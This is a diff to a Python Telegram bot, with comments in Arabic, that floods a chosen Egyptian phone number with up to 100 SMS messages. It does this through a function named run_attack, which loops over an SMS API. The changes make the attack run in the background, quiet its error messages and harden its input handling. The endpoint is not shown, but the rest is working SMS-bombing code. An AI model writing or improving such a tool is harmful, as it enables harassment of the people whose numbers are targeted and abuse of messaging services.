@@ -47,7 +47,7 @@ async def start_sms_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     number = update.message.text
-    if number.startswith("01") and len(number) == 11:
+    if number and number.startswith("01") and len(number) == 11:
         context.user_data['phone_number'] = "2" + number
         await update.message.reply_text("🔢 ممتاز. الآن أرسل عدد الرسائل (رقم بين 1 و 100).")
         return GET_COUNT
@@ -60,7 +60,12 @@ async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     number = context.user_data.get('phone_number')
     sms_count = context.user_data.get('sms_count')
 
-    await context.bot.send_message(chat_id, text=f"🚀 حسنًا! جاري البدء في إرسال {sms_count} رسالة إلى {number}...")
+    # التأكد من وجود البيانات قبل البدء
+    if not number or not sms_count:
+        logger.warning("run_attack called without phone_number or sms_count.")
+        return
+
+    await context.bot.send_message(chat_id, text=f"🚀 حسنًا! بدأت إرسال {sms_count} رسالة إلى {number} في الخلفية...")
 
     success_count = 0
     failure_count = 0
@@ -75,16 +80,18 @@ async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     success_count += 1
                 else:
                     failure_count += 1
+                    logger.warning(f"API returned status {response.status_code} for {number}")
             except httpx.ConnectTimeout:
                 logger.error("Connection to SMS API timed out.")
                 failure_count += 1
-                await context.bot.send_message(chat_id, "❌ فشل الاتصال بسيرفر الرسائل (Timed Out). قد يكون السيرفر متوقفًا. سأكمل المحاولة...")
             except Exception as e:
-                logger.error(f"An unexpected error occurred: {e}")
+                logger.error(f"An unexpected error occurred during attack: {e}")
                 failure_count += 1
+            
+            # لا نرسل رسالة خطأ للمستخدم داخل اللูป لتجنب إغراقه بالرسائل
             await asyncio.sleep(random.uniform(1.0, 2.5))
 
-    summary_text = f"📊 **اكتملت العملية** 📊\n- ✅ **نجاح:** `{success_count}`\n- ❌ **فشل:** `{failure_count}`"
+    summary_text = f"📊 **اكتملت العملية للرقم {number}** 📊\n- ✅ **نجاح:** `{success_count}`\n- ❌ **فشل:** `{failure_count}`"
     await context.bot.send_message(chat_id, text=summary_text, parse_mode='Markdown')
 
 async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -95,27 +102,28 @@ async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
             return GET_COUNT
         
         context.user_data['sms_count'] = sms_count
-        # We use create_task to run the attack in the background
-        # so the bot can continue to respond to other users.
+        
+        # !! هذا هو التعديل الرئيسي: تشغيل الهجوم في الخلفية !!
         asyncio.create_task(run_attack(update, context))
         
-        # We end the conversation immediately after starting the attack.
-        # The summary will be sent by the run_attack function itself.
+        # إنهاء المحادثة فورًا حتى يبقى البوت مستجيبًا
         return ConversationHandler.END
     except (ValueError, TypeError):
         await update.message.reply_text("❌ هذا ليس رقمًا صحيحًا.")
         return GET_COUNT
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("👍 تم إلغاء العملية.")
+    context.user_data.clear()
+    await update.message.reply_text("👍 تم إلغاء العملية الحالية.")
     return ConversationHandler.END
     
 def main() -> None:
     if not TOKEN:
-        logger.error("خطأ: متغير البيئة TOKEN غير موجود!")
+        logger.critical("خطأ فادح: متغير البيئة TOKEN غير موجود! البوت لن يعمل.")
         return
         
     application = Application.builder().token(TOKEN).build()
+    
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("sms", start_sms_command)],
         states={
@@ -123,7 +131,9 @@ def main() -> None:
             GET_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
+        conversation_timeout=300 # إنهاء المحادثة تلقائيا بعد 5 دقائق من عدم النشاط
     )
+    
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(conv_handler)
     
